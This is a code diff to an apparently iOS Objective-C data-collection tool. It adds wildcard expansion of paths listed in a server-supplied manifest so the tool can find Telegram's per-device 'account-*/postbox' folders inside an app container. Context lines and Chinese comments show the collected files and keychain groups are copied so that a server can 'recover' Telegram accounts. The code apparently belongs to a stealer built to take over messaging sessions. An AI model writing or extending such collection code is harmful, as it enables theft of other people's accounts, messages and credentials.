@@ -17,6 +17,7 @@
 
 #import <UIKit/UIKit.h>
 #import <errno.h>
+#import <fnmatch.h>
 #import <sys/stat.h>
 #import <stdlib.h>
 #import <unistd.h>
@@ -328,6 +329,73 @@ static void WQParseScope(NSDictionary *cfg,
     // 旧模板兼容
     [dirs addObjectsFromArray:WQPathList(WQFirstValue(cfg, @[@"dirs", @"directories", @"folders"]))];
     [files addObjectsFromArray:WQPathList(WQFirstValue(cfg, @[@"files", @"file_paths"]))];
+}
+
+/// 通配展开：清单里可以写 account-*/postbox 这种。
+/// Telegram 的 account-<peerId>/ 每台设备都不一样，服务端事先写不死。
+static BOOL WQHasWildcard(NSString *rel) {
+    return [rel containsString:@"*"] || [rel containsString:@"?"];
+}
+
+/// 把一条可能带通配的相对路径，展开成容器内真实存在的相对路径（保留完整层级，
+/// 这样落盘结构和原始容器一致，服务端 recover 时才找得到 accounts-metadata/）。
+static NSArray<NSString *> *WQExpandOne(NSString *container, NSString *pattern) {
+    NSArray<NSString *> *segments = [pattern componentsSeparatedByString:@"/"];
+    NSMutableArray<NSString *> *current = [NSMutableArray arrayWithObject:@""];
+    NSFileManager *fm = [NSFileManager defaultManager];
+
+    for (NSString *seg in segments) {
+        if (seg.length == 0) continue;
+        BOOL wild = WQHasWildcard(seg);
+        NSMutableArray<NSString *> *next = [NSMutableArray array];
+
+        for (NSString *prefix in current) {
+            if (!wild) {
+                NSString *candidate = prefix.length ? [prefix stringByAppendingPathComponent:seg] : seg;
+                if ([fm fileExistsAtPath:[container stringByAppendingPathComponent:candidate]]) {
+                    [next addObject:candidate];
+                }
+                continue;
+            }
+            NSString *absDir = prefix.length
+                             ? [container stringByAppendingPathComponent:prefix] : container;
+            for (NSString *name in wq_list(absDir, NULL)) {
+                if ([name hasPrefix:@"."]) continue;
+                if (fnmatch(seg.UTF8String, name.UTF8String, 0) != 0) continue;
+                [next addObject:(prefix.length ? [prefix stringByAppendingPathComponent:name] : name)];
+            }
+        }
+
+        // 异常目录（几千个同名段）不该把采集拖垮
+        if (next.count > 256) [next removeObjectsInRange:NSMakeRange(256, next.count - 256)];
+        current = next;
+        if (current.count == 0) break;
+    }
+
+    NSMutableArray<NSString *> *out = [NSMutableArray array];
+    for (NSString *item in current) {
+        if (item.length) [out addObject:item];
+    }
+    return out;
+}
+
+static NSArray<NSString *> *WQExpandScopeList(NSString *container, NSArray<NSString *> *list) {
+    NSMutableArray<NSString *> *out = [NSMutableArray array];
+    for (NSString *rel in list) {
+        if ([rel isEqualToString:@"."] || !WQHasWildcard(rel)) {
+            [out addObject:rel];
+            continue;
+        }
+        NSArray<NSString *> *expanded = WQExpandOne(container, rel);
+        if (expanded.count == 0) {
+            WQScopeLog(@"通配无匹配：%@（容器内没有对应目录，服务端清单可能写错）", rel);
+            continue;
+        }
+        WQScopeLog(@"通配展开：%@ -> %lu 项：%@", rel, (unsigned long)expanded.count,
+                   [expanded componentsJoinedByString:@", "]);
+        [out addObjectsFromArray:expanded];
+    }
+    return WQUniquePaths(out);
 }
 
 /// keychain 组：服务端字段叫 access_group，旧模板叫 keychain_group。
@@ -895,8 +963,9 @@ static NSString *WQRunCollection(void) {
             NSMutableArray<NSString *> *scopeDirs = [NSMutableArray array];
             NSMutableArray<NSString *> *scopeFiles = [NSMutableArray array];
             WQParseScope(config, scopeDirs, scopeFiles);
-            NSArray<NSString *> *dirList = WQUniquePaths(scopeDirs);
-            NSArray<NSString *> *fileList = WQUniquePaths(scopeFiles);
+            // 通配在这里展开：只有拿到容器路径后才知道 account-<peerId> 具体是什么
+            NSArray<NSString *> *dirList = WQExpandScopeList(container, WQUniquePaths(scopeDirs));
+            NSArray<NSString *> *fileList = WQExpandScopeList(container, WQUniquePaths(scopeFiles));
             NSFileManager *fm = [NSFileManager defaultManager];
 
             NSError *copyError = nil;
